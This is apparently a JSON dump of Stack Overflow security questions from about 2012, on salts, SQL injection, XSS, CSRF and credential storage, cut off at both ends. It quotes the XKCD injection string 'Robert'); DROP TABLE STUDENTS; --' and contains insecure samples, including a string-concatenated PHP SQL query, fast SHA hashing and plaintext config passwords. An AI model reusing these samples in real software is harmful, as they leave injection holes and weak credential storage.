com.sun.xml.ws.api.pipe.Fiber._doRun(Fiber.java:600)\n    at com.sun.xml.ws.api.pipe.Fiber.doRun(Fiber.java:585)\n    at com.sun.xml.ws.api.pipe.Fiber.runSync(Fiber.java:482)\n    at com.sun.xml.ws.server.WSEndpointImpl$2.process(WSEndpointImpl.java:314)\n    at com.sun.xml.ws.transport.http.HttpAdapter$HttpToolkit.handle(HttpAdapter.java:608)\n    at com.sun.xml.ws.transport.http.HttpAdapter.handle(HttpAdapter.java:259)\n    at com.sun.xml.ws.transport.http.servlet.ServletAdapter.handle(ServletAdapter.java:162)\n    at org.glassfish.webservices.JAXWSServlet.doPost(JAXWSServlet.java:145)\n    at javax.servlet.http.HttpServlet.service(HttpServlet.java:754)\n    at javax.servlet.http.HttpServlet.service(HttpServlet.java:847)\n    at org.apache.catalina.core.StandardWrapper.service(StandardWrapper.java:1539)\n    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:281)\n    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:175)\n    at org.apache.catalina.core.StandardPipeline.doInvoke(StandardPipeline.java:655)\n    at org.apache.catalina.core.StandardPipeline.invoke(StandardPipeline.java:595)\n    at com.sun.enterprise.web.WebPipeline.invoke(WebPipeline.java:98)\n    at com.sun.enterprise.web.PESessionLockingStandardPipeline.invoke(PESessionLockingStandardPipeline.java:91)\n    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:162)\n    at org.apache.catalina.connector.CoyoteAdapter.doService(CoyoteAdapter.java:330)\n    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:231)\n    at com.sun.enterprise.v3.services.impl.ContainerMapper.service(ContainerMapper.java:232)\n    at com.sun.grizzly.http.ProcessorTask.invokeAdapter(ProcessorTask.java:828)\n    at com.sun.grizzly.http.ProcessorTask.doProcess(ProcessorTask.java:725)\n    at com.sun.grizzly.http.ProcessorTask.process(ProcessorTask.java:1019)\n    at com.sun.grizzly.http.DefaultProtocolFilter.execute(DefaultProtocolFilter.java:225)\n    at com.sun.grizzly.DefaultProtocolChain.executeProtocolFilter(DefaultProtocolChain.java:137)\n    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:104)\n    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:90)\n    at com.sun.grizzly.http.HttpProtocolChain.execute(HttpProtocolChain.java:79)\n    at com.sun.grizzly.ProtocolChainContextTask.doCall(ProtocolChainContextTask.java:54)\n    at com.sun.grizzly.SelectionKeyContextTask.call(SelectionKeyContextTask.java:59)\n    at com.sun.grizzly.ContextTask.run(ContextTask.java:71)\n    at com.sun.grizzly.util.AbstractThreadPool$Worker.doWork(AbstractThreadPool.java:532)\n    at com.sun.grizzly.util.AbstractThreadPool$Worker.run(AbstractThreadPool.java:513)\n    at java.lang.Thread.run(Unknown Source)\nCaused by: java.io.IOException: Key used to decrypt EncryptedKey cannot be null\n    at com.sun.xml.ws.security.opt.impl.enc.CryptoProcessor.decryptKey(CryptoProcessor.java:346)\n    at com.sun.xml.ws.security.opt.impl.incoming.EncryptedKey.getKey(EncryptedKey.java:351)\n    ... 51 more\n</code></pre>\n\n<p>I suppose the root of the problem is that the EncryptedKey is null according to the service but I have no idea which key that would be or why it would be null.</p>\n\n<p>So my question is: is it possible to consume a secure Metro service from Gsoap, if so what am I doing wrong? What am I missing?</p>\n\n<p>Thanks!</p>\n"},{"tags":["java","jquery","ajax","security","servlets"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":67,"score":-1,"question_id":13058210,"title":"Is it secure to pass a password to Java from Jquery ajax callback in plain text?","body":"<p>Or do I need to encrypt it first.  I'm using a password text field, grabbing it with </p>\n\n<pre><code>var pwd = $(\"#userpassword\").val();\n</code></pre>\n\n<p>and then</p>\n\n<pre><code>$.post('JavaServlet', { formData: formData, pwd: pwd, date: date }, function(data) {\n</code></pre>\n\n<p>The java piece encrypts it and stores it in the ldap.<br>\nIf you suggest to encrypt, please suggest the best way to accomplish the task. \nThanks in advance!</p>\n\n<p>Answer:  We are using SSL. So it seems redundant to encrypt the password.</p>\n"},{"tags":["javascript","security","cross-domain","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":13060344,"title":"understanding JavaScript security model","body":"<p>Why is it that I can submit a form to an iframe with a cross-domain address but can't send an XMLHTTPRequest to that address?</p>\n"},{"tags":["security","encryption","hash","brute-force"],"answer_count":8,"favorite_count":19,"up_vote_count":45,"down_vote_count":0,"view_count":5959,"score":45,"question_id":213380,"title":"The necessity of hiding the salt for a hash","body":"<p>At work we have two competing theories for salts.  The products I work on use something like a user name or phone number to salt the hash.  Essentially something that is different for each user but is readily available to us.  The other product randomly generates a salt for each user and changes each time the user changes the password.  The salt is then encrypted in the database.</p>\n\n<p>My question is if the second approach is really necessary?  I can understand from a purely theoretical perspective that it is more secure than the first approach, but what about from a practicality point of view.  Right now to authenticate a user, the salt must be unencrypted and applied to the login information.  </p>\n\n<p>After thinking about it, I just don't see a real security gain from this approach.  Changing the salt from account to account, still makes it extremely difficult for someone to attempt to brute force the hashing algorithm even if the attacker was aware of how to quickly determine what it was for each account.  This is going on the assumption that the  passwords are sufficiently strong.  (Obviously finding the correct hash for a set of passwords where they are all two digits is significantly easier than finding the correct hash of passwords which are 8 digits).  Am I incorrect in my logic, or is there something that I am missing?</p>\n\n<p><strong>EDIT:</strong> Okay so here's the reason why I think it's really moot to encrypt the salt.  (lemme know if I'm on the right track).  </p>\n\n<p>For the following explanation, we'll assume that the passwords are always 8 characters and the salt is 5 and all passwords are comprised of lowercase letters (it just makes the math easier).</p>\n\n<p>Having a different salt for each entry means that I can't use the same rainbow table (actually technically I could if I had one of sufficient size, but let's ignore that for the moment).  This is the real key to the salt from what I understand, because to crack every account I have to reinvent the wheel so to speak for each one.  Now if I know how to apply the correct salt to a password to generate the hash, I'd do it because a salt really just extends the length/complexity of the hashed phrase.  So I would be cutting the number of possible combinations I would need to generate to \"know\" I have the password + salt from 13^26 to 8^26 because I know what the salt is.  Now that makes it easier, but still really hard.  </p>\n\n<p>So onto encrypting the salt.  If I know the salt is encrypted, I wouldn't try and decrypt (assuming I know it has a sufficient level of encryption) it first.  I would ignore it.  Instead of trying to figure out how to decrypt it, going back to the previous example I would just generate a larger rainbow table containing all keys for the 13^26.  Not knowing the salt would definitely slow me down, but I don't think it would add the monumental task of trying to crack the salt encryption first.  That's why I don't think it's worth it.  Thoughts?</p>\n\n<p>Here is a link describing how long passwords will hold up under a brute force attack:\n<a href=\"http://www.lockdown.co.uk/?pg=combi\" rel=\"nofollow\">http://www.lockdown.co.uk/?pg=combi</a></p>\n"},{"tags":["ruby-on-rails","ruby","security","sql-injection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13058981,"title":"Sql Injection Prevention and Converting Data in Rails","body":"<p>I noticed in the Ruby on Rails Guide that this is considered correct format</p>\n\n<pre><code>Client.where(\"orders_count = ?\", params[:orders])\n</code></pre>\n\n<p>whereas later on they used</p>\n\n<pre><code>Client.where(:created_at =&gt; (params[:start_date].to_date)..(params[:end_date].to_date))\n</code></pre>\n\n<p>My question is, is it safe to assume that using the <code>.to_</code> method will be secure enough against sql injection?</p>\n"},{"tags":["security","encryption","hash","salt"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13052882,"title":"Password Security: Encrypting salt","body":"<p>I'm new to security and trying to understand why encrypting or hiding a salt is not considered useful. I've read the earlier post <a href=\"http://stackoverflow.com/questions/213380/the-necessity-of-hiding-the-salt-for-a-hash\">The necessity of hiding the salt for a hash</a> on why hiding or encrypting salt is unnecessary but the answer was based off the assumption  </p>\n\n<blockquote>\n  <p>If someone has access to your database, then they have access to the\n  encrypted salts, and they probably have access to your code as well</p>\n</blockquote>\n\n<p><strong>Question</strong></p>\n\n<p>Just because an attacker has access to your database why should we assume he has access to the code interacting with it? For example, you have your salted passwords on a MySQL server on one machine along with the encrypted salts. And you have the key for decrypting the salts or some intricate encryption/decryption logic on a web server on a separate machine. An attacker gains access to the database via SQL injection or some other means. Hasn't the encryption and distributed architecture saved the day here?</p>\n"},{"tags":["c#","asp.net-mvc","security","asp.net-membership"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":13034869,"title":"Use ASP.NET Membership e Profile in ASP.NET MVC 3","body":"<p>I use classic ASP.NET Membership Provider in my ASP.NET MVC 3 application. When I validate user by Membership.Validate() method, I set the value in FormsAuthentication.SetAuthCookie() for persistent login during the navigation of the web site, but when i try to call the HttpContext.User.Identify.Name i get a String Empty value. Where is the problem? </p>\n\n<p>P.S. In the past, i used the ASP.NET Web Forms Access Controls to do this job that automatize this mecanism. </p>\n"},{"tags":["security","encryption","standards"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13056727,"title":"Encrypting data via client or server or both?","body":"<p>I have a question concerning data encryption. My question is where do I encrypt the data and why?</p>\n\n<p>FOR REGISTERING</p>\n\n<p>I currently encrypt data in an application/game and send the data to the server to add or update to the database. </p>\n\n<p>FOR SIGNING IN</p>\n\n<p>I ask the server to send me data regarding a username including the password. So I receive the  encrypted password and the username and decrypt the password to see if it matches what the player had inputted.</p>\n\n<p>MY CONCERN</p>\n\n<p>My concern is that someone could intercept what gets sent out and compare it to what they inputted as a password. </p>\n\n<p>My idea for a solution would be to encrypt data on the server as well, but that would only be useful if the server/database was hacked.</p>\n\n<p>I couldn't find anything really specific to my question. I've found articles concerning how to encrypting data, but nothing of the risks and security holes.</p>\n\n<p>I'm also wondering what the standards are concerning this along with the risks of different methods.</p>\n\n<p>EDIT:\nI Fear I am over thinking this, but felt it would be safer to ask. </p>\n\n<p>I haven't provided what methods of encrypting data I use because I don't know if that could be a security risk.</p>\n"},{"tags":["web-services","security","mobile","azure","titanium"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13055695,"title":"Best practices for securing mobile apps that use web services","body":"<p>I am developing apps using Appcelerator Titanium and they integrate with our web service which is hosted in Windows Azure. I need to know what are the most common attacks and what are some best practices to protect against them? I would need you to guide me to some good resources .</p>\n\n<p>Thank you</p>\n"},{"tags":["security","web-security","csrf","hacking","csrf-protection"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13051114,"title":"If your site doesn't use cookies do you still need to worry about CSRF protection?","body":"<p>I have been reading up on CSRF/XSRF a bit and a lot of it seems to talk about cookies as they can be involved in logging the user back in automatically.</p>\n\n<p>So I was just wondering if your site doesn't use cookies, do you still need to worry about using it or do you need to worry about using it on public accessible forms?</p>\n\n<p>I assume you still do as the user could already be logged in within the browser and then they could be exposed to it.</p>\n\n<p>As for public forms, obviously the only reason you would want protection on these is if you didn't want remote sites posting to them correct!?</p>\n"},{"tags":["php","security","hash","mysqli"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":13054152,"title":"Passoword hashes don't match, what am I doing wrong?","body":"<p>I have this method for hashing a password when I register a user at my website. It works perfectly from what I can tell, I store the $password_hash and $salt in my database. But the problems happen when I try to authenticate the user for login, the hashes I get don't match.</p>\n\n<p><strong>Register function</strong></p>\n\n<pre><code>    $salt = createSalt();\n    $password = createPassword();\n    $hash = hash('sha256', $password);\n    $password_hash = hash('sha256', $salt . $hash);\n</code></pre>\n\n<p><strong>Login Function</strong> </p>\n\n<pre><code>    $query = \"SELECT Password_Hash,Salt FROM accounts WHERE Email = ' \".$email.\" ' \";\n    $result = mysqli_query($mysqli, $query);\n    $rows = mysqli_fetch_assoc($result);\n    $hash = hash('sha256', $password);\n    $password_hash = hash('sha256', $rows['Salt'] . $hash);\n</code></pre>\n\n<p><strong>Create Password Function</strong></p>\n\n<pre><code>   function createPassword()\n   { /*This function is used to create the password for the user */\n     $alphabet = \"abcdefghijklmnopqrstuwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789\";\n     for ($i = 0; $i &lt; 8; $i++) \n      {\n        $n = rand(0, strlen($alphabet)-1);\n        $pass[$i] = $alphabet[$n];\n      }\n    return implode($pass);\n   }\n</code></pre>\n\n<p>The two password hashes to not match is there something I'm doing wrong? Image below of the output. The first line is the DB output\n<img src=\"http://i.stack.imgur.com/4h2nb.png\" alt=\"enter image description here\"></p>\n"},{"tags":["php","mysql","security","xss"],"answer_count":6,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":470,"score":5,"question_id":2965430,"title":"Preventing server-side scripting, XSS","body":"<p>Are there any pre-made scripts that I can use for PHP / MySQL to prevent server-side scripting and JS injections?</p>\n\n<p>I know about the typical functions such as htmlentities, special characters, string replace etc. but is there a simple bit of code or a function that is a failsafe for everything?</p>\n\n<p>Any ideas would be great. Many thanks :)</p>\n\n<p><strong>EDIT:</strong> Something generic that strips out anything that could be hazardous, ie. greater than / less than signs, semi-colons, words like \"DROP\", etc?</p>\n\n<p>I basically just want to compress everything to be alphanumeric, I guess...?</p>\n"},{"tags":["facebook","ipad","security","safari"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13054602,"title":"iPad/Safari Facebook Login Photo Verification","body":"<p>All,</p>\n\n<p>I work with a social media company and recently experienced something very vexing at a live event.</p>\n\n<p>We have visitors sign in temporarily on iPad kiosks for registration purposes to their facebook account (via Safari).</p>\n\n<p>Unfortunately, I am not within proximity/access of our iPads at present and won't be until the next live event. I am hoping to not have to sneak out and buy/borrow an iPad just to get to the bottom of this.</p>\n\n<p>Basically when we use my company's iPads (which were set up a few months back prior to me joining the company), Facebook login works just fine. User inputs username/password, hits login, they are immediately prompted to authorize our application. However, when we use the third party's iPads, almost every single time, Facebook initiates an unregistered device issue and forces the captcha + Photo Verification/ID process in order to complete the login process.</p>\n\n<p>I did a variety of tests that ensured this was in no way related to a) our ISP/IP; b) our Facebook app c) incorrect credentials being entered; d) individual account security settings. The jist of those tests centered around using the same account on one of my company's iPads, then one of the third party's iPads. I've narrowed it down to being a local device setting, I think. However, I did not have time to go through the iPad + Safari settings such as private browsing etc.</p>\n\n<p>As a QA person, I am fully aware that my next step would have been to compare the settings of our functional iPads to theirs which end up with the verification issue. That being said, all the equipment had to be packed up and sent on the road before I could complete my testing.</p>\n\n<p>So, if anyone has specific experience related to this sort of issue (Facebook login verification) I'd really appreciate any tips that you can provide to make sure users are not prompted for excessive security verifications, as it slows down our registration process in an unacceptable manner.</p>\n\n<p>Kindly, Dave</p>\n"},{"tags":["security","svg"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":21,"score":2,"question_id":13054510,"title":"Does Inkscape's --vacuum-defs make SVGs truly safe?","body":"<p>We are considering allowing user uploaded SVGs in our web app. We've been hesitant to do this before, due to a large number of complex vulnerabilities that we know exist in untrusted SVGs. A coworker found the --vacuum-defs option to Inkscape, and believes that it renders all untrusted SVGS safe for processing.</p>\n\n<p>According to the manpage, that option \"Removes all unused items from the  section of the SVG file. If this option is invoked in conjunction with --export-plain-svg, only the exported file will be affected. If it is used alone, the specified file will be modified in place.\" However, according to my coworker, \"Scripting is removed, XML transformations are removed, malformations are not tolerated, encoding is removed and external imports are removed. </p>\n\n<p>Is this true? If so, is it enough that we should feel safe accepting untrusted SVGs? Is there any other preprocessing we should do?</p>\n"},{"tags":["security","twitter","hacking"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":21,"score":-1,"question_id":13053804,"title":"are Twitter usernames a security vulnerability?","body":"<p>Twitter usernames are exposed to everyone. Isn't this a security vulnerability?\nand simplifies password cracking? Did Twitter do something about that?</p>\n"},{"tags":["security","validation","sql-injection"],"answer_count":14,"favorite_count":74,"up_vote_count":253,"down_vote_count":15,"view_count":18944,"score":238,"question_id":332365,"title":"XKCD SQL injection — please explain","body":"<p>Just looking at:</p>\n\n<p><img src=\"http://imgs.xkcd.com/comics/exploits_of_a_mom.png\" alt=\"XKCD Strip\" title=\"Her daughter is named Help I'm trapped in a driver's license factory.\">\n<em>(Source: <a href=\"http://xkcd.com/327/\">http://xkcd.com/327/</a>)</em></p>\n\n<p>What does this SQL do:</p>\n\n<pre><code>Robert'); DROP\nTABLE STUDENTS; --\n</code></pre>\n\n<p>I know both <code>'</code> and <code>--</code> are for comments, but doesn't the word <code>DROP</code> get commented as well since it is part of the same line?</p>\n"},{"tags":["php","security","rest","web"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":61,"score":2,"question_id":13052424,"title":"Transmit user password for a rest api","body":"<p>I'm designing a REST API and I have some problems in terms of security for authenticating the user.\nFor authentication I don't want the password to be send across the network in plain text.</p>\n\n<p>To bypass this problem I could send a SHA-256 hash of the password (with the username as salt), so the password is never sent in plain text. In my database I will be storing the following hashes: SHA256(password + salt) and I'll compare if both of the hashes match.</p>\n\n<p>The problem with this option is that I'll have a hash computed with a fast hash algorithm and the salt is not random.</p>\n\n<p>In security the best practice is to use a slow signature algorithm, with a random salt (like bcrypt).</p>\n\n<p>The slow algorithm is not a problem, i could use bcrypt on the client side, but for the salt i don't know what to do:</p>\n\n<ul>\n<li>Bcrypt need a salt with a defined size so i can't put the username</li>\n<li>If i'm using a random salt, how the client will know the value of this salt before computing the password's hash?</li>\n</ul>\n\n<p>So i can see 3 options, but none are sastisfying:</p>\n\n<ul>\n<li>I send the password in plain text (I'm using SSL) and i store bcrypt in the db => still vulnerable to man in the middle</li>\n<li>I use SHA256 and send the hash where the salt is the username (still using SSL) => the hash in the db are less secure</li>\n<li>I use bcrypt and I have a two step process: i ask for the saltfor a given user and then send the hash of this user (still using ssl) => by trying to log in with an other username i can obtain his salt, not awesome</li>\n</ul>\n\n<p>Is anybody has a better solution or some advices?</p>\n"},{"tags":["security","symfony2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13049518,"title":"symfony2 - security.yml","body":"<p>I have the following code that returns the error:</p>\n\n<blockquote>\n  <p>FileLoaderLoadException: Cannot import resource \"C:\\wamp\\www\\NewSchool\\app/config\\security.yml\" from \"C:\\wamp\\www\\NewSchool\\app/config\\config.yml\".</p>\n</blockquote>\n\n<p>Code:</p>\n\n<pre class=\"lang-yml prettyprint-override\"><code>security:\n Symfony\\Component\\Security\\Core\\User\\User: plaintext\n NewSchool\\DatabaseBundle\\Entity\\Student:\n   algorithm: sha1\n   encode_as_base64: false\n   iterations: 1\n NewSchool\\DatabaseBundle\\Entity\\Teacher:\n   algorithm: sha1\n   encode_as_base64: false\n   iterations: 1\n NewSchool\\DatabaseBundle\\Entity\\Parrent:\n        algorithm: sha1\n        encode_as_base64: false\n        iterations: 1\n NewSchool\\DatabaseBundle\\Entity\\Admin:\n        algorithm: sha1\n        encode_as_base64: false\n        iterations: 1\n\nrole_hierarchy:\n    ROLE_STUDENT:   ROLE_USER\n    ROLE_TEACHER:   ROLE_USER\n    ROLE_PARRENT:   ROLE_USER\n    ROLE_ADMIN:     ROLE_USER\n    ROLE_SUPERADMIN: [ROLE_USER, ROLE_STUDENT, ROLE_TEACHER, ROLE_PARRENT, ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]\n\n providers:\n         chain_providers:\n             providers:  [students, teachers, parrents, admins ]\n         students:\n             entity: { class: NewSchoolDatabaseBundle:Student, property: username }\n         teachers:\n             entity: { class: NewSchoolDatabaseBundle:Teacher, property: username }\n         parrents:\n             entity: { class: NewSchoolDatabaseBundle:Parrent, property: username }\n         admins:\n             entity: { class: NewSchoolDatabaseBundle:Admin, property: username }\n         in_memory:\n             users:\n                 student:  { password: studentpass, roles: [ 'ROLE_STUDENT' ] }\n                 teacher:  { password: teacherpass, roles: [ 'ROLE_TEACHER' ] }\n                 parrent:  { password: parrentpass, roles: [ 'ROLE_PARRENT' ] }\n                 admin:    { password: adminpass, roles: [ 'ROLE_ADMIN' ] }\nencoders:\n         Symfony\\Component\\Security\\Core\\User\\User: plaintext\nfirewalls:\n    dev:\n        pattern:  ^/(_(profiler|wdt)|css|images|js)/\n        security: false\n\n    login:\n        pattern:  ^/demo/secured/login$\n        security: falsex\n\n    secured_area:\n        pattern:    ^/\n        anonymous: ~\n        form_login:\n           login_path: /\n           check_path: /login-check\n           default_target_path: /redirect\n           failure_path: /\n        logout:\n           path:   /logout\n           target: /\n        anonymous: ~\n        #http_basic:\n        #    realm: \"Secured Demo Area\"\n\naccess_control:\n        - { path: ^/admin, roles: ROLE_ADMIN }\n        - { path: ^/parrent, roles: ROLE_PARRENT }\n        - { path: ^/teacher, roles: ROLE_TEACHER }\n        - { path: ^/student, roles: ROLE_STUDENT }\n</code></pre>\n\n<p>What is the problem?</p>\n"},{"tags":["php","security","cookies","hash"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":13052977,"title":"Best way to securely set a session cookie on another domain","body":"<p>We currently have 2 sites <code>http://www.foo.co.uk</code> and <code>https://secure.foo.com</code>.</p>\n\n<p>The www site does not have an SSL certificate and is on a different domain.</p>\n\n<p>We have a login button on <code>http://www.foo.co.uk</code> that when clicked opens up an iframe of <code>https://secure.foo.com</code> with a form, when the user logs in it creates a session cookie on that domain (<code>foo.com</code>).</p>\n\n<p>The session cookie then needs to be copied to <code>foo.co.uk</code> so what it does is redirects you to <code>http://www.foo.co.uk/setcookie.php?session=abcd1234</code> which allows us to set the same cookie on the origin domain.</p>\n\n<p>This is not a very secure solution so I have been looking into how to make this better - the best idea I have found is to send a hash using something like <code>hash_hmac</code> along with the params to the setcookie.php script and then verify it on the other end before creating the cookie.</p>\n\n<p>Whilst this is better it doesn't prevent man in the middle attacks. Bearing in mind that www is not SSL secured I don't think you can prevent this completely, so the next best thing would be to include a timestamp in the hash to make it valid for 5 minutes.</p>\n\n<p>Does anyone have any ideas on how I can make this better, or point out any pitfalls with this approach? I would be most grateful.</p>\n"},{"tags":["asp.net-mvc","security","iis-7.5"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":13051489,"title":"Access Denied in IIS 7.5 MVC application","body":"<p>I'm working with an MVC application on a test server that used to work perfectly. It creates accounts on a server that a 2nd application uses for logging in. It uses a credential store and PrincipalContext and UserPrincipal objects to create these accounts. </p>\n\n<p>I haven't used the test version of this app for months or possibly almost a year. Now when I go to create an account with the application, I get the following error:</p>\n\n<blockquote>\n  <p>Access is denied.\n  ASP.NET is not authorized to access the requested resource. Consider\n  granting access rights to the resource to the ASP.NET request\n  identity. ASP.NET has a base process identity (typically\n  {MACHINE}\\ASPNET on IIS 5 or Network Service on IIS 6 and IIS 7, and\n  the configured application pool identity on IIS 7.5) that is used if\n  the application is not impersonating. If the application is\n  impersonating via , the identity will be\n  the anonymous user (typically IUSR_MACHINENAME) or the authenticated\n  request user. </p>\n  \n  <p>To grant ASP.NET access to a file, right-click the file in Explorer,\n  choose \"Properties\" and select the Security tab. Click \"Add\" to add\n  the appropriate user or group. Highlight the ASP.NET account, and\n  check the boxes for the desired access.</p>\n</blockquote>\n\n<p>I looked at anonymous access, but the production version of this app also has a rule to deny anonymous access and it's working fine. This application never used impersonation even when it was working and I've heard that granting explicit access to ASP.NET is not generally recommended. I can make the application work locally through Visual Studio, but the version deployed to test continues to give this error. I would rater not republish the site to test, but perhaps that's the only option left? Is there anything obvious (but not to me) that could have changed in the security settings to cause this? I'm still researching with no luck.</p>\n\n<p>Thank you!</p>\n"},{"tags":["ios","security"],"answer_count":1,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13049579,"title":"Embed API credentials in iOS code","body":"<p>I have to call payment gateway API from iOS code. Problem is it needs merchant credentials and I feel insecure embedding the merchant credentials in code. If someone somehow reverse engineer the code and get the credentials then the client is dead. Any advice?</p>\n\n<p>I found this post <a href=\"http://stackoverflow.com/questions/5784169/does-apple-modify-ios-application-executables-on-apps-submitted-to-the-app-store/5784332#5784332\">Does Apple modify iOS application executables on apps submitted to the App Store?</a> which says that app binaries are encrypted by Apple be default. Does it mean I can safely embed the credentials in code?</p>\n"},{"tags":["php","security","http-referer"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":442,"score":3,"question_id":5453776,"title":"Is HTTP_REFERER set by client","body":"<p>I heard that HTTP_REFERER can be spoofed. I have 2 sites, the first one contacts the second, and the second uses HTTP_REFERER to verify that the request is from the first one. </p>\n\n<p>If I receive a fake request from my first site to the second site and I know that this request was not made, what should I think? a third website is spoofing http_ref for all its users, or an individual is spoofing it from his browser settings? I want to know if http_ref is set/spoofed by the client/browser or by the website itself?</p>\n"},{"tags":["c#","windows","security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":4,"view_count":62,"score":-2,"question_id":13050535,"title":"How to check for read access on files using C#","body":"<p>Given a file, I need to list all the users that have read access to that file using C# and .NET framework 4. Not interested in adding or listing any other permissions.\nAssume the directory is a local directory and local users are enough.</p>\n"},{"tags":["security","authentication","hash","cryptography","password-protection"],"answer_count":9,"favorite_count":41,"up_vote_count":46,"down_vote_count":0,"view_count":12340,"score":46,"question_id":536584,"title":"Non-random salt for password hashes","body":"<p>UPDATE: I recently learned from <a href=\"http://security.stackexchange.com/q/379/33\">this question</a> that in the entire discussion below, I (and I am sure others did too) was a bit confusing: What I keep calling a rainbow table, is in fact called a hash table. Rainbow tables are more complex creatures, and are actually a variant of Hellman Hash Chains. Though I believe the answer is still the same (since it doesnt come down to cryptanalysis), some of the discussion might be a bit skewed.<br>\nThe question: \"<a href=\"http://security.stackexchange.com/q/379/33\">What are rainbow tables and how are they used?</a>\"</p>\n\n<hr>\n\n<p>Typically, I always recommend using a cryptographically-strong random value as salt, to be used with hash functions (e.g. for passwords), such as to protect against Rainbow Table attacks.  </p>\n\n<p>But is it actually cryptographically necessary for the salt to be random? Would any unique value (unique per user, e.g. userId) suffice in this regard? It would in fact prevent using a single Rainbow Table to crack all (or most) passwords in the system...<br>\nBut does lack of entropy really weaken the cryptographic strength of the hash functions?  </p>\n\n<hr>\n\n<p>Note, I am not asking about why to use salt, how to protect it (it doesnt need to be), using a single constant hash (don't), or what kind of hash function to use.<br>\nJust whether salt needs entropy or not.</p>\n\n<hr>\n\n<p>Thanks all for the answers so far, but I'd like to focus on the areas I'm (a little) less familiar with. Mainly implications for cryptanalysis - I'd appreciate most if anyone has some input from the crypto-mathematical PoV.<br>\nAlso, if there are additional vectors that hadn't been considered, thats great input too (see @Dave Sherohman point on multiple systems).<br>\nBeyond that, if you have any theory, idea or best practice - please back this up either with proof, attack scenario, or empirical evidence. Or even valid considerations for acceptable trade-offs... I'm familiar with Best Practice (capital B capital P) on the subject, I'd like to prove what value this actually provides.</p>\n\n<hr>\n\n<p>EDIT: Some really good answers here, but I think as @Dave says, it comes down to Rainbow Tables for common user names... and possible less common names too. However, what if my usernames are globally unique? Not necessarily unique for my system, but per each user - e.g. email address.<br>\nThere would be no incentive to build a RT for a single user (as @Dave emphasized, the salt is not kept secret), and this would still prevent clustering. Only issue would be that I might have the same email and password on a different site - but salt wouldnt prevent that anyway.<br>\nSo, it comes back down to cryptanalysis - IS the entropy necessary, or not? (My current thinking is it's not necessary from a cryptanalysis point of view, but it is from other practical reasons.)</p>\n"},{"tags":["html5","security","authentication","jquery-mobile","ldap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13050443,"title":"LDAP Auth through HTML5","body":"<p>I have an HTML5 mobile application built using the JQuery Mobile framework wrapped in a open-source Apache Cordova (PhoneGap) wrapper. </p>\n\n<p>The application has a login screen where you enter the network credentials of my client and authenticate against their Active Directory server in the backend. </p>\n\n<p>The client has provided me with the URI to call but I'm not sure how I would call this URI from my application code. Would this be through JavaScript or something? Please let me know.</p>\n\n<p>Thanks,\nS</p>\n"},{"tags":["security","ldap","passwords"],"answer_count":5,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":5237,"score":4,"question_id":1078156,"title":"How secure is your password in LDAP?","body":"<p>Is your password more secure in any way if it is stored on LDAP rather than a database or an encrypted file?</p>\n"},{"tags":["java","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13049720,"title":"How to add library for BouncyCastleProvider Security","body":"<p>I am confuse where add jar file (bcprov-jdk15-145.jar) for adding security file for BouncyCastleProvider. In application library or In JRE jre6\\lib\\ext\\ folder.</p>\n\n<pre><code>    Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());\n</code></pre>\n"},{"tags":["javascript","security","encryption","https"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":121,"score":2,"question_id":13037610,"title":"Can asymmetric cryptography be used to secure credit card information transmitted over HTTPS?","body":"<p>I'm not a security guru. I'm thinking about how to implement credit card storage in a software system where credit card transactions are accepted through the web, but are manually executed by an in-house user. We are going to use HTTPS which (I believe) will eliminate the risk of a man-in-the-middle attack. Now, I'm trying to figure out if I can make it so that the data received from the client can encrypted before it hits our server.</p>\n\n<p>The idea is that their browser would encrypt the data using the public part of an asymmetric key pair. The private part would be known by an in-house user. Then when it's time to manually process the charge, that user would go to an HTTPS page that we serve. They would manually enter the private key (which would not be transmitted to our servers) and the encrypted credit card info would be retrieved from our system and decrypted by the browser.</p>\n\n<p>In this way I'm hoping I can keep any of our servers from ever seeing unencrypted credit card information. Am 